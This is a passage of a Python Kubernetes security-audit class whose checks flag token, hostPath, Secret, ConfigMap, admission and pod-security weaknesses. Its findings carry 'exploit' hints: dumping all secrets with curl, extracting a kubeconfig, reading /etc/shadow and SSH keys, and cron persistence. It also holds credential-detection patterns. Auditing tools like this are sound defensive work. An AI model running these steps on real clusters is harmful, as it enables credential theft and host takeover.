                )
                self.escape_vectors.append({
                    'type': 'AUTOMOUNT_CLUSTERADMIN_SA',
                    'severity': 'CRITICAL',
                    'description': description,
                    'exploit': (
                        f'Exec into {pod_name}: cat /var/run/secrets/kubernetes.io/'
                        f'serviceaccount/token; use token against API server with '
                        'cluster-admin rights — get secrets -A, create privileged pods, etc.'
                    ),
                })
            else:
                severity = 'MEDIUM'
                description = (
                    f'Pod {ns}/{pod_name} auto-mounts SA token for {sa_name!r} '
                    '— lateral movement via pod compromise; scope = SA RBAC grants'
                )

            entry = {
                'namespace': ns,
                'pod': pod_name,
                'service_account': sa_name,
                'automount': True,
                'is_clusteradmin': is_clusteradmin,
                'severity': severity,
                'description': description,
            }
            results.append(entry)

        self.sa_automount_findings = results
        return results

    # ------------------------------------------------------------------
    # HostPath volume escape surface
    # Source: K8s In Action 2e ch9 — hostPath volumes bypass container
    # isolation; path "/" = full host filesystem; socket paths = daemon control.
    # K8s Best Practices 2e ch9 — hostPath is the most common escape primitive;
    # default-deny via PSA restricted profile blocks hostPath entirely.
    # ------------------------------------------------------------------

    _HOSTPATH_CRITICAL = frozenset({
        '/', '/proc', '/sys', '/dev',
        '/var/run/docker.sock', '/var/run/containerd',
        '/etc/shadow', '/etc/kubernetes',
    })
    _HOSTPATH_HIGH = frozenset({'/var/log', '/tmp', '/run'})

    def check_hostpath_mounts(self) -> list:
        """
        GET /api/v1/pods across all namespaces.
        Classify each hostPath volume by path:
          - path == "/" or in critical set: CRITICAL HOST_ROOT_HOSTPATH_MOUNT
          - path in high set + writable mount: HIGH HOSTPATH_SENSITIVE_WRITABLE
          - any hostPath present: LOW HOSTPATH_VOLUME_PRESENT
        Returns list of dicts: {severity, title, detail, namespace, pod,
                                volume_name, host_path, read_only}
        """
        data = self._api_get('/api/v1/pods')
        results = []
        if not data or 'items' not in data:
            return results

        for item in data['items']:
            meta = item.get('metadata', {})
            spec = item.get('spec', {})
            ns = meta.get('namespace', '')
            pod_name = meta.get('name', '')

            for vol in spec.get('volumes', []):
                if 'hostPath' not in vol:
                    continue

                hp = vol['hostPath']
                path = hp.get('path', '')
                vol_name = vol.get('name', '')

                # Determine readOnly from volumeMounts across all containers
                writable_containers = []
                readonly_containers = []
                all_containers = (
                    spec.get('containers', [])
                    + spec.get('initContainers', [])
                    + spec.get('ephemeralContainers', [])
                )
                for container in all_containers:
                    for vm in container.get('volumeMounts', []):
                        if vm.get('name') == vol_name:
                            if vm.get('readOnly', False):
                                readonly_containers.append(container.get('name', ''))
                            else:
                                writable_containers.append(container.get('name', ''))
                is_writable = bool(writable_containers)

                base_entry = {
                    'namespace': ns,
                    'pod': pod_name,
                    'volume_name': vol_name,
                    'host_path': path,
                    'read_only': not is_writable,
                    'host': self.api_server or '',
                    'port': 443,
                }

                # LOW: any hostPath present
                low_entry = dict(base_entry)
                low_entry.update({
                    'severity': 'LOW',
                    'title': 'HOSTPATH_VOLUME_PRESENT',
                    'detail': (
                        f'Pod {ns}/{pod_name} mounts hostPath {path!r} '
                        f'(volume: {vol_name!r}, writable: {is_writable})'
                    ),
                })
                results.append(low_entry)

                if path == '/' or path in self._HOSTPATH_CRITICAL:
                    crit_entry = dict(base_entry)
                    title = (
                        'HOST_ROOT_HOSTPATH_MOUNT' if path == '/'
                        else 'CRITICAL_HOSTPATH_MOUNT'
                    )
                    crit_entry.update({
                        'severity': 'CRITICAL',
                        'title': title,
                        'detail': (
                            f'Pod {ns}/{pod_name} mounts hostPath {path!r} — '
                            'full host filesystem / privileged path access'
                        ),
                    })
                    results.append(crit_entry)
                    self.escape_vectors.append({
                        'type': title,
                        'severity': 'CRITICAL',
                        'description': (
                            f'Pod {ns}/{pod_name} has hostPath volume {path!r} — '
                            'host filesystem escape surface'
                        ),
                        'exploit': (
                            f'Exec into {pod_name}: read /etc/shadow, SSH keys, '
                            'kubeconfig from the mounted host path. '
                            'Write cron jobs for persistence if writable.'
                        ),
                    })

                elif path in self._HOSTPATH_HIGH and is_writable:
                    high_entry = dict(base_entry)
                    high_entry.update({
                        'severity': 'HIGH',
                        'title': 'HOSTPATH_SENSITIVE_WRITABLE',
                        'detail': (
                            f'Pod {ns}/{pod_name} mounts hostPath {path!r} '
                            f'writable (containers: {writable_containers}) — '
                            'log injection or temp directory persistence'
                        ),
                    })
                    results.append(high_entry)

        self.hostpath_findings = results
        return results

    # ------------------------------------------------------------------
    # Secret encoding weakness / unauth read detection
    # Source: K8s In Action 2e ch8 — Secrets are base64 encoded, not
    # encrypted; anyone who can GET /api/v1/secrets gets plaintext after
    # decode. K8s cloud book ch16 — RBAC required to restrict secret reads;
    # default ServiceAccount may have overly broad secret access.
    # ------------------------------------------------------------------

    _SECRET_SENSITIVE_KEYS = re.compile(
        r'(?i)(password|passwd|pass|pwd|secret|token|api[_\-]?key|'
        r'private[_\-]?key|access[_\-]?key|kubeconfig|credential|bearer)'
    )
    _SECRET_VALUE_PATTERNS = [
        (re.compile(r'AKIA[0-9A-Z]{16}'),            'AWS_ACCESS_KEY'),
        (re.compile(r'-----BEGIN (?:RSA |EC |)PRIVATE KEY'), 'PRIVATE_KEY'),
        (re.compile(r'ghp_[A-Za-z0-9]{36}'),         'GITHUB_TOKEN'),
        (re.compile(r'xoxb-[0-9]+-[0-9A-Za-z]+'),   'SLACK_TOKEN'),
        (re.compile(r'ya29\.[A-Za-z0-9_\-]+'),       'GOOGLE_OAUTH_TOKEN'),
    ]

    def check_secret_plaintext_exposure(self) -> list:
        """
        1. Attempt GET /api/v1/secrets without auth — 200 = CRITICAL SECRETS_READABLE_UNAUTH.
        2. With auth: scan secret data for high-value key names and value patterns
           (AWS keys, private keys, GitHub/Slack/GCP tokens).
        3. Flag kubernetes.io/service-account-token secrets readable = HIGH.
        4. Flag key named 'kubeconfig' in any secret = CRITICAL KUBECONFIG_IN_SECRET.
        Returns list of dicts: {severity, title, detail, namespace, secret_name, host, port}
        """
        results = []
        base = self.api_server or 'https://kubernetes.default.svc'
        api_host = self.api_server or ''
        port_val = 443

        # --- Unauthenticated probe ---
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        unauth_accessible = False
        try:
            req = urllib.request.Request(
                base.rstrip('/') + '/api/v1/secrets'
            )
            req.add_header('Accept', 'application/json')
            # No Authorization header — deliberate unauthenticated probe
            with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                if resp.status == 200:
                    unauth_accessible = True
                    results.append({
                        'severity': 'CRITICAL',
                        'title': 'SECRETS_READABLE_UNAUTH',
                        'detail': (
                            'GET /api/v1/secrets returned 200 without authentication '
                            '— all cluster secrets readable without credentials'
                        ),
                        'namespace': 'ALL',
                        'secret_name': None,
                        'host': api_host,
                        'port': port_val,
                    })
                    self.escape_vectors.append({
                        'type': 'SECRETS_READABLE_UNAUTH',
                        'severity': 'CRITICAL',
                        'description': (
                            'K8s API /api/v1/secrets accessible without authentication'
                        ),
                        'exploit': (
                            f'curl -sk {base}/api/v1/secrets | '
                            'jq .items[].data | base64 -d  '
                            '# full cluster credential dump, no auth needed'
                        ),
                    })
        except Exception:
            pass

        # --- Authenticated content scan ---
        if not unauth_accessible and self.token:
            data = self._api_get('/api/v1/secrets')
            if data and 'items' in data:
                for item in data['items']:
                    meta = item.get('metadata', {})
                    ns = meta.get('namespace', '')
                    name = meta.get('name', '')
                    secret_type = item.get('type', 'Opaque')
                    raw_data = item.get('data', {})

                    # Service account token readable
                    if secret_type == 'kubernetes.io/service-account-token':
                        results.append({
                            'severity': 'HIGH',
                            'title': 'SERVICE_ACCOUNT_TOKEN_READABLE',
                            'detail': (
                                f'Secret {ns}/{name} type=kubernetes.io/service-account-token '
                                'is readable — token can be used to impersonate the SA'
                            ),
                            'namespace': ns,
                            'secret_name': name,
                            'host': api_host,
                            'port': port_val,
                        })

                    for key, b64val in raw_data.items():
                        # Decode value
                        try:
                            decoded = base64.b64decode(b64val).decode('utf-8', errors='replace')
                        except Exception:
                            decoded = ''

                        # kubeconfig key = CRITICAL
                        if key.lower() == 'kubeconfig':
                            results.append({
                                'severity': 'CRITICAL',
                                'title': 'KUBECONFIG_IN_SECRET',
                                'detail': (
                                    f'Secret {ns}/{name} contains key {key!r} — '
                                    'kubeconfig embedded in secret grants cluster access'
                                ),
                                'namespace': ns,
                                'secret_name': name,
                                'host': api_host,
                                'port': port_val,
                            })
                            self.escape_vectors.append({
                                'type': 'KUBECONFIG_IN_SECRET',
                                'severity': 'CRITICAL',
                                'description': (
                                    f'Secret {ns}/{name} key {key!r} contains a kubeconfig — '
                                    'extract to gain cluster-level access'
                                ),
                                'exploit': (
                                    f'kubectl get secret {name} -n {ns} -o jsonpath='
                                    '\'{.data.kubeconfig}\' | base64 -d > /tmp/kc.yaml; '
                                    'KUBECONFIG=/tmp/kc.yaml kubectl get nodes'
                                ),
                            })
                            continue

                        # High-value value pattern match
                        for pattern, label in self._SECRET_VALUE_PATTERNS:
                            if decoded and pattern.search(decoded):
                                results.append({
                                    'severity': 'HIGH',
                                    'title': f'SECRET_CONTAINS_{label}',
                                    'detail': (
                                        f'Secret {ns}/{name} key {key!r} value matches '
                                        f'{label} pattern — credential material exposed'
                                    ),
                                    'namespace': ns,
                                    'secret_name': name,
                                    'host': api_host,
                                    'port': port_val,
                                })
                                break

                        # Sensitive key name (password/passwd/pass/pwd in key)
                        if self._SECRET_SENSITIVE_KEYS.search(key):
                            results.append({
                                'severity': 'MEDIUM',
                                'title': 'SECRET_SENSITIVE_KEY_NAME',
                                'detail': (
                                    f'Secret {ns}/{name} has key {key!r} matching '
                                    'credential naming pattern — verify value is not cleartext'
                                ),
                                'namespace': ns,
                                'secret_name': name,
                                'host': api_host,
                                'port': port_val,
                            })

        self.secret_plaintext_findings = results
        return results

    # ------------------------------------------------------------------
    # ConfigMap as secret anti-pattern
    # Source: K8s In Action 2e ch8 — ConfigMaps are not encrypted at rest
    # or in transit; storing credentials in ConfigMaps instead of Secrets
    # removes the (weak) access-control distinction and is visible to anyone
    # with configmap read permission (far broader than secret read).
    # ------------------------------------------------------------------

    _CM_URL_KEYS = re.compile(
        r'(?i)(database[_\-]?url|db[_\-]?url|redis[_\-]?url|'
        r'mongodb[_\-]?uri|postgres[_\-]?url|mysql[_\-]?url|'
        r'connection[_\-]?string|dsn)'
    )
    _CM_SENSITIVE_VALUE = re.compile(
        r'(?i)(password|secret|api[_\-]?key|private[_\-]?key|token|credential)',
    )

    def check_configmap_sensitive_data(self) -> list:
        """
        GET /api/v1/configmaps across all namespaces.
        Scan each ConfigMap's keys and values for credential patterns:
          - Key or value matching password/secret/key/token = HIGH SENSITIVE_DATA_IN_CONFIGMAP
          - Key matching DATABASE_URL / REDIS_URL / MONGODB_URI patterns = HIGH DATABASE_URL_IN_CONFIGMAP
        Returns list of dicts: {severity, title, detail, namespace, configmap, key, host, port}
        """
        data = self._api_get('/api/v1/configmaps')
        results = []
        if not data or 'items' not in data:
            return results

        api_host = self.api_server or ''
        port_val = 443

        for item in data['items']:
            meta = item.get('metadata', {})
            ns = meta.get('namespace', '')
            name = meta.get('name', '')
            cm_data = item.get('data', {})

            for key, value in cm_data.items():
                # Database/connection URL keys
                if self._CM_URL_KEYS.search(key):
                    results.append({
                        'severity': 'HIGH',
                        'title': 'DATABASE_URL_IN_CONFIGMAP',
                        'detail': (
                            f'ConfigMap {ns}/{name} key {key!r} contains a connection URL — '
                            'not encrypted at rest; visible to any principal with configmap read'
                        ),
                        'namespace': ns,
                        'configmap': name,
                        'key': key,
                        'host': api_host,
                        'port': port_val,
                    })
                    continue

                # Sensitive key name
                if _looks_like_cred(key):
                    results.append({
                        'severity': 'HIGH',
                        'title': 'SENSITIVE_DATA_IN_CONFIGMAP',
                        'detail': (
                            f'ConfigMap {ns}/{name} key {key!r} matches credential naming pattern '
                            '— not encrypted at rest; use Secrets with RBAC restriction instead'
                        ),
                        'namespace': ns,
                        'configmap': name,
                        'key': key,
                        'host': api_host,
                        'port': port_val,
                    })
                    continue

                # Sensitive value content even if key name is benign
                if value and self._CM_SENSITIVE_VALUE.search(str(value)):
                    results.append({
                        'severity': 'HIGH',
                        'title': 'SENSITIVE_DATA_IN_CONFIGMAP',
                        'detail': (
                            f'ConfigMap {ns}/{name} key {key!r} value contains credential-pattern '
                            'text — ConfigMap is not encrypted at rest'
                        ),
                        'namespace': ns,
                        'configmap': name,
                        'key': key,
                        'host': api_host,
                        'port': port_val,
                    })

        self.configmap_sensitive_findings = results
        return results

    # ------------------------------------------------------------------
    # Projected volume / bound service account token audit
    # Source: K8s In Action 2e ch9 — projected volumes aggregate multiple
    # volume sources (SA token, ConfigMap, Secret, Downward API) into one
    # mount. Bound SA tokens have configurable audience and expiry;
    # cross-audience tokens can be presented to external OIDC consumers.
    # K8s cloud book ch16 — short-lived tokens (default 1h) reduce blast
    # radius but tokens projected with external audiences create SSRF/confused
    # deputy risks if the workload is compromised.
    # ------------------------------------------------------------------

    def check_projected_volume_abuse(self) -> list:
        """
        GET /api/v1/pods across all namespaces.
        For each pod.spec.volumes with type 'projected', inspect sources for
        serviceAccountToken entries:
          - audience != 'kubernetes' (or absent) = MEDIUM CROSS_AUDIENCE_TOKEN_PROJECTED
          - any SA token in projected volume = INFO SERVICE_ACCOUNT_TOKEN_PROJECTED
        Returns list of dicts: {severity, title, detail, namespace, pod,
                                volume_name, audience, expiration_seconds, host, port}
        """
        data = self._api_get('/api/v1/pods')
        results = []
        if not data or 'items' not in data:
            return results

        api_host = self.api_server or ''
        port_val = 443

        for item in data['items']:
            meta = item.get('metadata', {})
            spec = item.get('spec', {})
            ns = meta.get('namespace', '')
            pod_name = meta.get('name', '')

            for vol in spec.get('volumes', []):
                if 'projected' not in vol:
                    continue
                proj = vol['projected']
                vol_name = vol.get('name', '')

                for source in proj.get('sources', []):
                    sa_token = source.get('serviceAccountToken')
                    if not sa_token:
                        continue

                    audience = sa_token.get('audience', 'kubernetes')
                    expiry = sa_token.get('expirationSeconds', 3600)

                    base_entry = {
                        'namespace': ns,
                        'pod': pod_name,
                        'volume_name': vol_name,
                        'audience': audience,
                        'expiration_seconds': expiry,
                        'host': api_host,
                        'port': port_val,
                    }

                    # INFO: any SA token in projected volume
                    info_entry = dict(base_entry)
                    info_entry.update({
                        'severity': 'INFO',
                        'title': 'SERVICE_ACCOUNT_TOKEN_PROJECTED',
                        'detail': (
                            f'Pod {ns}/{pod_name} volume {vol_name!r} projects SA token '
                            f'(audience={audience!r}, expirationSeconds={expiry})'
                        ),
                    })
                    results.append(info_entry)

                    # MEDIUM: token projected for external audience
                    if audience and audience != 'kubernetes':
                        med_entry = dict(base_entry)
                        med_entry.update({
                            'severity': 'MEDIUM',
                            'title': 'CROSS_AUDIENCE_TOKEN_PROJECTED',
                            'detail': (
                                f'Pod {ns}/{pod_name} volume {vol_name!r} projects SA token '
                                f'with audience={audience!r} — token is accepted by external '
                                'service; pod compromise allows token theft for that service'
                            ),
                        })
                        results.append(med_entry)

        self.projected_volume_findings = results
        return results

    # ------------------------------------------------------------------
    # Admission controller coverage check
    # Source: Production K8s ch8 — ValidatingWebhookConfiguration / MutatingWebhook-
    # Configuration absence means no policy layer between kubectl and etcd.
    # OPA/Gatekeeper absence = zero rego-enforced constraints. PodDisruptionBudgets
    # absence = unchecked disruption risk (secondary signal, not security-critical).
    # ------------------------------------------------------------------

    def check_admission_controllers(self) -> dict:
        """
        Broad admission-control coverage check:
          - validatingwebhookconfigurations: 0 = HIGH NO_VALIDATING_WEBHOOKS
          - mutatingwebhookconfigurations: failurePolicy=Ignore = MEDIUM WEBHOOK_FAILURE_POLICY_IGNORE
          - gatekeeper-system pods: absent = HIGH OPA_GATEKEEPER_NOT_INSTALLED
          - poddisruptionbudgets (all ns): absent/empty = MEDIUM NO_POD_DISRUPTION_BUDGETS
        Returns dict: {findings: list[{severity,title,detail,host,port}], summary: str}
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}

        # --- validating webhooks ---
        vwh_data = self._api_get(
            '/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations'
        )
        validating_count = 0
        if vwh_data and 'items' in vwh_data:
            for cfg in vwh_data['items']:
                validating_count += len(cfg.get('webhooks', []))

        if validating_count == 0:
            findings.append(dict(base, **{
                'severity': 'HIGH',
                'title': 'NO_VALIDATING_WEBHOOKS',
                'detail': (
                    'No ValidatingWebhookConfigurations found — '
                    'policy enforcement (OPA/Gatekeeper, image signing, '
                    'custom admission checks) is absent; any resource '
                    'passes admission unchallenged'
                ),
            }))

        # --- mutating webhooks: failurePolicy=Ignore ---
        mwh_data = self._api_get(
            '/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations'
        )
        if mwh_data and 'items' in mwh_data:
            for cfg in mwh_data['items']:
                cfg_name = cfg.get('metadata', {}).get('name', '')
                for wh in cfg.get('webhooks', []):
                    if wh.get('failurePolicy', 'Fail') == 'Ignore':
                        findings.append(dict(base, **{
                            'severity': 'MEDIUM',
                            'title': 'WEBHOOK_FAILURE_POLICY_IGNORE',
                            'detail': (
                                f'MutatingWebhookConfiguration {cfg_name!r} '
                                f'webhook {wh.get("name","")!r} failurePolicy=Ignore — '
                                'webhook bypass possible if endpoint is unreachable '
                                f'within {wh.get("timeoutSeconds", 10)}s'
                            ),
                        }))

        # --- OPA / Gatekeeper: gatekeeper-system pods ---
        gk_data = self._api_get('/api/v1/namespaces/gatekeeper-system/pods')
        gk_running = bool(
            gk_data and 'items' in gk_data and len(gk_data['items']) > 0
        )
        if not gk_running:
            findings.append(dict(base, **{
                'severity': 'HIGH',
                'title': 'OPA_GATEKEEPER_NOT_INSTALLED',
                'detail': (
                    'No pods found in gatekeeper-system namespace — '
                    'OPA/Gatekeeper policy engine not installed; '
                    'rego-based constraints (required labels, image allow-lists, '
                    'privileged-container prohibitions) are not enforced'
                ),
            }))

        # --- PodDisruptionBudgets ---
        pdb_data = self._api_get('/apis/policy/v1/poddisruptionbudgets')
        pdb_count = 0
        if pdb_data and 'items' in pdb_data:
            pdb_count = len(pdb_data['items'])
        if pdb_count == 0:
            findings.append(dict(base, **{
                'severity': 'MEDIUM',
                'title': 'NO_POD_DISRUPTION_BUDGETS',
                'detail': (
                    'No PodDisruptionBudgets found cluster-wide — '
                    'workloads have no disruption protection; '
                    'an attacker with node-eviction capability can '
                    'drain all replicas simultaneously'
                ),
            }))

        result = {
            'findings': findings,
            'validating_webhook_count': validating_count,
            'gatekeeper_running': gk_running,
            'pdb_count': pdb_count,
        }
        self.admission_controller_findings = findings
        return result

    # ------------------------------------------------------------------
    # Pod Security Standards: PSP + privileged pod + runAsRoot audit
    # Source: Production K8s ch8 — PodSecurityPolicy deprecated 1.21/removed
    # 1.25; successor is Pod Security Admission (PSA) with enforce labels.
    # Detecting privileged=true containers and runAsUser=0 independently of
    # PSA label state gives a direct workload-posture signal.
    # ------------------------------------------------------------------

    def check_pod_security_standards(self) -> dict:
        """
        Checks:
          - Namespace PSA labels: absent = MEDIUM NO_POD_SECURITY_LABELS
          - PSP (v1beta1): privileged + allowPrivilegeEscalation = CRITICAL PRIVILEGED_PSP_ACTIVE
          - Running pods: securityContext.privileged=true = CRITICAL PRIVILEGED_PODS_RUNNING
          - Running pods: runAsUser=0 or runAsNonRoot missing = HIGH PODS_RUNNING_AS_ROOT
        Returns dict: {findings: list[{severity,title,detail,host,port}], counts: dict}
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}
        counts = {
            'ns_missing_psa_label': 0,
            'privileged_psps': 0,
            'privileged_pods': 0,
            'root_pods': 0,
        }

        # --- Namespace PSA label check ---
        system_ns = {'kube-system', 'kube-public', 'kube-node-lease'}
        ns_data = self._api_get('/api/v1/namespaces')
        if ns_data and 'items' in ns_data:
            for item in ns_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('name', '')
                if ns in system_ns:
                    continue
                labels = meta.get('labels', {})
                has_psa = any(
                    k.startswith('pod-security.kubernetes.io/') for k in labels
                )
                if not has_psa:
                    counts['ns_missing_psa_label'] += 1
                    findings.append(dict(base, **{
                        'severity': 'MEDIUM',
                        'title': 'NO_POD_SECURITY_LABELS',
                        'detail': (
                            f'Namespace {ns!r} has no pod-security.kubernetes.io/* labels — '
                            'Pod Security Admission not configured; privileged workloads '
                            'permitted without controller enforcement'
                        ),
                    }))

        # --- PodSecurityPolicy audit (deprecated v1beta1, still present pre-1.25) ---
        psp_data = self._api_get('/apis/policy/v1beta1/podsecuritypolicies')
        if psp_data and 'items' in psp_data:
            for psp in psp_data['items']:
                psp_name = psp.get('metadata', {}).get('name', '')
                spec = psp.get('spec', {})
                privileged = spec.get('privileged', False)
                allow_priv_esc = spec.get('allowPrivilegeEscalation', True)
                if privileged or allow_priv_esc:
                    counts['privileged_psps'] += 1
                    findings.append(dict(base, **{
                        'severity': 'CRITICAL',
                        'title': 'PRIVILEGED_PSP_ACTIVE',
                        'detail': (
                            f'PodSecurityPolicy {psp_name!r} has '
                            f'privileged={privileged}, '
                            f'allowPrivilegeEscalation={allow_priv_esc} — '
                            'any workload bound to this PSP can escalate to host root'
                        ),
                    }))

        # --- Running pod securityContext checks ---
        pods_data = self._api_get('/api/v1/pods')
        if pods_data and 'items' in pods_data:
            for item in pods_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                pod_name = meta.get('name', '')
                spec = item.get('spec', {})
                pod_sc = spec.get('securityContext', {})

                for container in spec.get('containers', []) + spec.get('initContainers', []):
                    cname = container.get('name', '')
                    csc = container.get('securityContext', {})

                    # privileged=true
                    if csc.get('privileged', False):
                        counts['privileged_pods'] += 1
                        findings.append(dict(base, **{
                            'severity': 'CRITICAL',
                            'title': 'PRIVILEGED_PODS_RUNNING',
                            'detail': (
                                f'Pod {ns}/{pod_name} container {cname!r} '
                                'securityContext.privileged=true — '
                                'container has host-level capabilities; '
                                'trivial host escape via /proc or device nodes'
                            ),
                        }))

                    # runAsUser=0 or runAsNonRoot not set
                    run_as_user = csc.get('runAsUser', pod_sc.get('runAsUser', None))
                    run_as_non_root = csc.get(
                        'runAsNonRoot', pod_sc.get('runAsNonRoot', False)
                    )
                    if run_as_user == 0 or (
                        run_as_user is None and not run_as_non_root
                    ):
                        counts['root_pods'] += 1
                        findings.append(dict(base, **{
                            'severity': 'HIGH',
                            'title': 'PODS_RUNNING_AS_ROOT',
                            'detail': (
                                f'Pod {ns}/{pod_name} container {cname!r} '
                                f'runAsUser={run_as_user}, runAsNonRoot={run_as_non_root} — '
                                'process runs as root (UID 0); container breakout '
                                'yields host root without UID remapping'
                            ),
                        }))

        result = {'findings': findings, 'counts': counts}
        self.pod_security_standards_findings = findings
        return result

    # ------------------------------------------------------------------
    # Secret rotation surface and external-secrets operator check
    # Source: Production K8s ch7 — secrets older than 1y signal no rotation
    # discipline; external-secrets operator absent = no Vault/AWS SM sync;
    # long-lived SA tokens are a standing credential with no expiry gate.
    # ------------------------------------------------------------------

    def check_secret_rotation_surface(self) -> dict:
        """
        Checks:
          - Secrets older than 365 days (creationTimestamp) = HIGH SECRETS_NOT_ROTATED
          - external-secrets namespace pods absent = HIGH EXTERNAL_SECRETS_OPERATOR_ABSENT
          - SA tokens of type kubernetes.io/service-account-token (no expiry) = HIGH NON_EXPIRING_SA_TOKENS
        Returns dict: {findings: list[{severity,title,detail,host,port}], counts: dict}
        """
        import datetime

        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}
        counts = {
            'stale_secrets': 0,
            'non_expiring_sa_tokens': 0,
            'external_secrets_running': False,
        }

        threshold_days = 365
        now = datetime.datetime.utcnow()

        # --- All secrets: age + SA token type ---
        secrets_data = self._api_get('/api/v1/secrets')
        if secrets_data and 'items' in secrets_data:
            for item in secrets_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                secret_type = item.get('type', '')
                created_str = meta.get('creationTimestamp', '')

                # age check
                if created_str:
                    try:
                        created = datetime.datetime.strptime(
                            created_str, '%Y-%m-%dT%H:%M:%SZ'
                        )
                        age_days = (now - created).days
                        if age_days >= threshold_days:
                            counts['stale_secrets'] += 1
                            findings.append(dict(base, **{
                                'severity': 'HIGH',
                                'title': 'SECRETS_NOT_ROTATED',
                                'detail': (
                                    f'Secret {ns}/{name} (type={secret_type!r}) '
                                    f'created {age_days} days ago — '
                                    'exceeds 365-day rotation threshold; '
                                    'credential compromise window is unbounded'
                                ),
                            }))
                    except Exception:
                        pass

                # non-expiring SA token check
                if secret_type == 'kubernetes.io/service-account-token':
                    annotations = meta.get('annotations', {})
                    # tokens created via TokenRequest API carry an expiry annotation;
                    # legacy SA tokens (this type) have none — they never expire
                    has_expiry = 'kubernetes.io/service-account.uid' in annotations and (
                        item.get('data', {}).get('token') is not None
                    )
                    # all secrets of this type are non-expiring by definition
                    counts['non_expiring_sa_tokens'] += 1
                    sa_name = annotations.get(
                        'kubernetes.io/service-account.name', '<unknown>'
                    )
                    findings.append(dict(base, **{
                        'severity': 'HIGH',
                        'title': 'NON_EXPIRING_SA_TOKENS',
                        'detail': (
                            f'Secret {ns}/{name} is a legacy SA token for '
                            f'ServiceAccount {sa_name!r} — '
                            'type kubernetes.io/service-account-token never expires; '
                            'token remains valid indefinitely after pod compromise'
                        ),
                    }))

        # --- external-secrets operator: check pods in external-secrets namespace ---
        es_data = self._api_get('/api/v1/namespaces/external-secrets/pods')
        es_running = bool(
            es_data and 'items' in es_data and len(es_data['items']) > 0
        )
        counts['external_secrets_running'] = es_running
        if not es_running:
            findings.append(dict(base, **{
                'severity': 'HIGH',
                'title': 'EXTERNAL_SECRETS_OPERATOR_ABSENT',
                'detail': (
                    'No pods found in external-secrets namespace — '
                    'External Secrets Operator not installed; '
                    'secrets are managed as static K8s Secret objects with '
                    'no Vault/AWS SM/GCP SM sync, no auto-rotation, '
                    'and no audit trail on secret access'
                ),
            }))

        result = {'findings': findings, 'counts': counts}
        self.secret_rotation_findings = findings
        return result

    # ------------------------------------------------------------------
    # Service routing exposure
    # Source: Production Kubernetes ch6 — Ingress controllers, Gateway API,
    # LoadBalancer service type, VirtualService misconfiguration
    # ------------------------------------------------------------------

    def check_ingress_exposure(self) -> dict:
        """
        Checks:
          - Ingress with no TLS = HIGH INGRESS_NO_TLS
          - Ingress with wildcard host = MEDIUM INGRESS_WILDCARD_HOST
          - HTTPRoute with no allowedRoutes.namespaces restriction = HIGH HTTPROUTE_CROSS_NAMESPACE_UNRESTRICTED
          - LoadBalancer service with externalTrafficPolicy=Cluster = MEDIUM LOADBALANCER_SOURCE_IP_LOST
        Returns dict: {findings: list[{severity,title,detail,host,port}], counts: dict}
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}
        counts = {
            'ingress_no_tls': 0,
            'ingress_wildcard_host': 0,
            'httproute_cross_namespace': 0,
            'loadbalancer_source_ip_lost': 0,
        }

        # --- Ingresses ---
        ingress_data = self._api_get('/apis/networking.k8s.io/v1/ingresses')
        if ingress_data and 'items' in ingress_data:
            for item in ingress_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                spec = item.get('spec', {})
                tls = spec.get('tls', [])
                rules = spec.get('rules', [])

                # No TLS configured at all
                if not tls:
                    counts['ingress_no_tls'] += 1
                    findings.append(dict(base, **{
                        'severity': 'HIGH',
                        'title': 'INGRESS_NO_TLS',
                        'detail': (
                            f'Ingress {ns}/{name} has no TLS configuration — '
                            'traffic between client and ingress controller is '
                            'unencrypted; credentials and session tokens exposed '
                            'to on-path observers; production Ingress must specify '
                            'spec.tls with a valid secret reference'
                        ),
                    }))

                # Wildcard host
                for rule in rules:
                    host = rule.get('host', '')
                    if host == '*' or host == '':
                        counts['ingress_wildcard_host'] += 1
                        findings.append(dict(base, **{
                            'severity': 'MEDIUM',
                            'title': 'INGRESS_WILDCARD_HOST',
                            'detail': (
                                f'Ingress {ns}/{name} has a wildcard or empty host '
                                f'rule (host={host!r}) — matches any request hostname; '
                                'virtual-host bypass possible: an attacker with DNS '
                                'or Host-header control can route arbitrary traffic '
                                'to this backend'
                            ),
                        }))
                        break  # one finding per Ingress

        # --- Gateway API HTTPRoutes ---
        httproute_data = self._api_get(
            '/apis/gateway.networking.k8s.io/v1/httproutes'
        )
        if httproute_data and 'items' in httproute_data:
            for item in httproute_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                spec = item.get('spec', {})
                parent_refs = spec.get('parentRefs', [])
                # allowedRoutes lives on the Gateway, not the HTTPRoute;
                # check for cross-namespace parentRef with no namespace match
                # condition: parentRef.namespace differs from HTTPRoute namespace
                for pref in parent_refs:
                    gw_ns = pref.get('namespace', ns)
                    if gw_ns != ns:
                        counts['httproute_cross_namespace'] += 1
                        findings.append(dict(base, **{
                            'severity': 'HIGH',
                            'title': 'HTTPROUTE_CROSS_NAMESPACE_UNRESTRICTED',
                            'detail': (
                                f'HTTPRoute {ns}/{name} references Gateway in '
                                f'namespace {gw_ns!r} — cross-namespace route '
                                'attachment without explicit allowedRoutes.namespaces '
                                'restriction allows any namespace to attach to a '
                                'shared Gateway; namespace isolation boundary broken'
                            ),
                        }))
                        break

        # --- LoadBalancer services: externalTrafficPolicy ---
        svc_data = self._api_get('/api/v1/services')
        if svc_data and 'items' in svc_data:
            for item in svc_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                spec = item.get('spec', {})
                svc_type = spec.get('type', '')
                etp = spec.get('externalTrafficPolicy', 'Cluster')
